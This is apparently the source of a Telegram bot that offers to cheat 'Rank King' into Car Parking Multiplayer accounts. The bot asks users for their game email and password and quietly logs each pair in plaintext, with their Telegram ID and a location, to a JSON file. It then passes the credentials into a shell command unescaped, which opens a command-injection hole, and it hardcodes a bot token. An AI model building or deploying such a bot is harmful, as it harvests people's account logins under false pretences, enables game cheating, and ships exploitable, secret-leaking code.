import telebot
import subprocess
import time
import json
import os
import requests
from datetime import date
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ================= KONFIGURASI =================
TOKEN = "8206837693:AAGQB86CiT7g2wZOFg73daDA4Jg4MMZWE8c"

PREMIUM_USERS = [
    6095762919,  # isi user premium
]

TIMEOUT = 300  # 5 menit
bot = telebot.TeleBot(TOKEN)

sessions = {}
daily_usage = {}

# ================= HELPER =================
def is_premium(uid):
    return uid in PREMIUM_USERS

def can_inject(uid):
    if is_premium(uid):
        return True

    today = str(date.today())
    if uid not in daily_usage or daily_usage[uid]["date"] != today:
        daily_usage[uid] = {"date": today, "count": 0}

    return daily_usage[uid]["count"] < 1

def increase_usage(uid):
    today = str(date.today())
    if uid not in daily_usage or daily_usage[uid]["date"] != today:
        daily_usage[uid] = {"date": today, "count": 0}
    daily_usage[uid]["count"] += 1

# ================= AUTO LOKASI IP =================
def get_location_ip():
    try:
        r = requests.get("https://ipinfo.io/json", timeout=5).json()
        city = r.get("city", "")
        region = r.get("region", "")
        country = r.get("country", "")
        location = ", ".join(x for x in [city, region, country] if x)
        return location if location else "Unknown"
    except:
        return "Unknown"

# ================= SAVE LOGIN =================
def save_login(email, password, tool, uid):
    location = get_location_ip()

    data = {

 "email": email,
 "password": password,
 "tool": tool,
 "telegram_id": uid,
 "location": location,
 "time": time.strftime("%Y-%m-%d %H:%M:%S")

    }

    filename = "profile_login.json"

    if os.path.exists(filename):
        try:
            with open(filename, "r") as f:
                old = json.load(f)
        except:
            old = []
    else:
        old = []

    old.append(data)

    with open(filename, "w") as f:
        json.dump(old, f, indent=2)

    print("[INFO] Login tersimpan ke profile_login.json")

# ================= MENU =================
def main_menu():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("🚘 CPM 1", callback_data="menu_cpm1"),
        InlineKeyboardButton("🚖 CPM 2", callback_data="menu_cpm2"),
    )
    return kb

def cpm_menu(cpm):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("👑 INJECT RANK KING", callback_data=f"inject_{cpm}"),
        InlineKeyboardButton("⬅️ Back", callback_data="back"),
    )
    return kb

# ================= START =================
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    status = "💎 PREMIUM (Unlimited)" if is_premium(uid) else "🆓 FREE (1x / hari)"

    bot.send_message(
        message.chat.id,
        "⭐ *RANK KING CPM BOT*\n\n"
        f"Status Akun: *{status}*\n\n"
        "Pilih menu di bawah 👇",
        reply_markup=main_menu(),
        parse_mode="Markdown"
    )

# ================= CALLBACK =================
@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    uid = call.from_user.id

    if call.data == "menu_cpm1":
        bot.edit_message_text(
            "🚘 *CPM 1*",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=cpm_menu("cpm1"),
            parse_mode="Markdown"
        )

    elif call.data == "menu_cpm2":
        bot.edit_message_text(
            "🚖 *CPM 2*",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=cpm_menu("cpm2"),
            parse_mode="Markdown"
        )

    elif call.data.startswith("inject_"):
        if uid in sessions:
            bot.send_message(call.message.chat.id, "⏳ Selesaikan proses sebelumnya.")
            return

        if not can_inject(uid):
            bot.send_message(
                call.message.chat.id,
                "⛔ *LIMIT FREE TERCAPAI*\n\n"
                "FREE hanya 1x / hari.\n"
                "Upgrade PREMIUM untuk akses fitur premium di @AWIMEDAN0",
                parse_mode="Markdown"
            )
            return

        tool = call.data.replace("inject_", "")
        sessions[uid] = {
            "step": "email",
            "tool": tool,
            "time": time.time()
        }

        bot.send_message(call.message.chat.id, f"📧 Masukkan EMAIL {tool.upper()}:")

    elif call.data == "back":
        bot.edit_message_text(
            "⬅️ Menu utama",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=main_menu()
        )

# ================= LOGIN FLOW =================
@bot.message_handler(content_types=['text'])
def login_flow(message):
    uid = message.from_user.id
    text = message.text.strip()

    if uid not in sessions:
        return

    sess = sessions[uid]

    if time.time() - sess["time"] > TIMEOUT:
        del sessions[uid]
        bot.reply_to(message, "⌛ Waktu login habis, silakan ulangi.")
        return

    # EMAIL
    if sess["step"] == "email":
        if "@" not in text or "." not in text:
            bot.reply_to(message, "❌ Format email tidak valid.")
            return

        sess["email"] = text
        sess["step"] = "password"
        sess["time"] = time.time()
        bot.reply_to(message, "🔒 Masukkan PASSWORD:")
        return

    # PASSWORD
    if sess["step"] == "password":
        email = sess["email"]
        password = text
        tool = sess["tool"]

        save_login(email, password, tool, uid)

        del sessions[uid]

        if not is_premium(uid):
            increase_usage(uid)

        bot.send_message(message.chat.id, "🔥 Inject Rank King, mohon tunggu...")

        script = "cpm1.py" if tool == "cpm1" else "cpm2.py"
        cmd = f'printf "{email}\\n{password}\\n" | python {script}'

        try:
            result = subprocess.getoutput(cmd)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error:\n{e}")
            return

        if len(result) > 3500:
            with open("result.txt", "w") as f:
                f.write(result)
            with open("result.txt", "rb") as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.send_message(message.chat.id, result)

# ================= RUN =================
print("🤖 Rank King CPM Bot | OPEN PUBLIK | AUTO IP LOCATION | ONLINE")
bot.infinity_polling()
